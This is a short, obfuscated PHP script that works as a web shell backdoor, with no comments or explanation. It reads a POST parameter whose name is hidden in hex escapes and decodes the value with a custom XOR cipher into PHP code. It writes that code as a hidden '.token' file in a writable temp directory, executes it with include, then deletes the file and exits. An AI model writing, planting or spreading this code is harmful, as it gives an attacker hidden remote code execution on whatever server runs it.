<?php

if(array_key_exists("\x68\x6Cd", $_POST) && !is_null($_POST["\x68\x6Cd"])){
	$pgrp = array_filter(["/var/tmp", sys_get_temp_dir(), "/tmp", getenv("TMP"), getcwd(), ini_get("upload_tmp_dir"), session_save_path(), getenv("TEMP"), "/dev/shm"]);
	$key = $_POST["\x68\x6Cd"];
	$key= explode ( 	'.'  	,	 $key)	  ;		
	$entry = '';
            $s = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($s	 );
            $z = 0;
    
            array_walk($key	 ,	function ($v3) use (&$entry	 ,	&$z	 ,	$s	 ,	$lenS) {	 $sChar = ord($s[$z		%$lenS]	 );
                $dec = ((int)$v3 - $sChar - ($z		%10))	^	80;
                $entry.=		chr($dec	 );
                $z++; 	});
	foreach ($pgrp as $key => $flg) {
    		if (is_dir($flg) && is_writable($flg)) {
    $desc = sprintf("%s/.token", $flg);
    $success = file_put_contents($desc, $entry);
if ($success) {
	include $desc;
	@unlink($desc);
	die();}
}
}
}